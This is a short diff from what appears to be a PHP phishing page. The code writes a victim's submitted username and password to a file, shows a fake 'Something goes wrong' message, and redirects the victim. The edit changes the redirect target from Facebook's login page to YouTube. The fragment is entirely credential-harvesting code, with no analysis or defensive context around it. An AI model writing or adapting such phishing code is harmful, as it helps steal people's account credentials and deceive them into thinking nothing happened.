@@ -6,7 +6,7 @@ fwrite($data, "Username: $account\nPassword: $passwd\n");
 fclose($data);
 ?>
 <html>
-<meta http-equiv="refresh" content="1;url=https://www.facebook.com/login.php">
+<meta http-equiv="refresh" content="1;url=https://www.youtube.com/">
 <body>
 Something goes wrong.Redirecting.......
 </body>
